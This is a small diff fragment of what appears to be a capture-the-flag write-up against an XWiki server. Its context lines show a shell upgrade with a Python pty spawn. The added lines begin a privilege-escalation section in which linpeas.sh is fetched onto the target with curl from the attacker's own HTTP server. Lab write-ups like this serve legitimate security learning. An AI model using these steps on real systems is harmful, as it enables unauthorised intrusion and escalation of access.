@@ -67,6 +67,9 @@ http://10.10.11.80:8080/xwiki/bin/get/Main/SolrSearch?media=rss&text=%7D%7D%7B%7
 ![[Pasted image 20250810030501.png]]
 
 This shell is not that beautiful so I just do `python3 -c 'import pty; pty.spawn("/bin/bash")'` so have a better shell. Yaaye!
+## Lateral Privilege Escalation
+
+I start by installing `linpeas.sh` on the remote host and run it. I installed `linpeas.sh` by exposing a `http.server` locally and then simply `curl -LO 10.10.16.16:8000/linpeas.sh`.
 
 
 
